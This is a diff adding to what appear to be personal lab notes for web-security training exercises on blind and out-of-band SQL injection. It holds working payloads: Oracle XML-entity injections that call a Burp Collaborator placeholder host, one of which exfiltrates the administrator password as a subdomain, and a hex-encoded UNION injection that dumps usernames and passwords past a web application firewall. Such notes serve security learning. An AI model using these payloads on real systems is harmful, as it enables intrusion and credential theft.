@@ -257,3 +257,19 @@ now we add a condition to trigger the sleep
 
 ### Blind SQL injection with out-of-band interaction
 
+Injection: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
+
+### Blind SQL injection with out-of-band data exfiltration
+
+Pulling data out with concatenating it and putting it in as a subdomain to our collaborator:
+`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
+
+### SQL injection with filter bypass via XML encoding
+
+This time we notice that the stock check feature sends the productId and storeId to the pplication in XML format. 
+- send the `POST /product/stock` to repeater
+- see if input is evaluated, enter this in the body: `<storeId>1+1</storeId>` if it does the math our data is being evaluated
+- now we can use a UNION attack to pull data out: `<storeId>1 UNION SELECT NULL</storeId>` we got blocked due to being flagged as a potential attack
+- To bypass the waf we can use the Hackvertor extension to encode our input: `Extensions > Hackvertor > Encode > dec_entities/hex_entities`
+- Resend and notice now we are no longer blocked
+- Now send this: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
